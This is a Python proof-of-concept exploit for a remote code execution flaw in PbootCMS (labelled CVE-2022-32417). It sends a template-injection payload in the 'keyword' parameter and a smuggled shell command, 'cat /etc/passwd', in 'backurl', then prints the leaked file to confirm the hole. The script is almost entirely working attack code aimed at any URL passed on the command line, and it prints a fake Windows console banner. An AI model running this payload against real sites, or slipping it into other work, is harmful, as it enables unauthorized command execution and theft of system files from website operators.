#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import http.client
from urllib.parse import urlparse

def parse_url(url):
    p_url = urlparse(url)
    scheme = p_url.scheme
    host = p_url.hostname
    port = p_url.port
    path = p_url.path
    if port  == None:
            if scheme == "http":
                port = 80
            else:
                port = 443
    return scheme, host, port, path

def request_http(host, port, path, method, headers={}, data=None):
    try:
        conn = http.client.HTTPConnection(host, port)
        conn.request(method, path, data, headers)
        response = conn.getresponse()
        return response.read()
    finally:
        conn.close()
    return ""

def request_https(host, port, path, method, headers={}, data=None):
    try:
        conn = http.client.HTTPSConnection(host, port)
        conn.request(method, path, data, headers)
        response = conn.getresponse()
        return response.read()
    finally:
        conn.close()
    return ""

def verify(site):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36", "Cookie": "lg=system"}
    scheme, host, port, path = parse_url(site)
    payload = "/index.php?keyword=}{pboot:if(get_lg/*&*/()/*&*/(get_backurl/*&*/()))}data{/pboot:if}&backurl=;cat%20/etc/passwd"
    if scheme == "http":
        data = request_http(host, port, payload, "GET", headers)
    else:
        data = request_https(host, port, payload, "GET", headers)
    if "root:x:0" in str(data, encoding="utf-8"):
        return str(data, encoding="utf-8")[:500]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 poc-yaml-pbootcms-rce-cve-2022-32417.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 cat /etc/passwd 的 结果为：", info)
    else:
        print("[-]漏洞不存在")
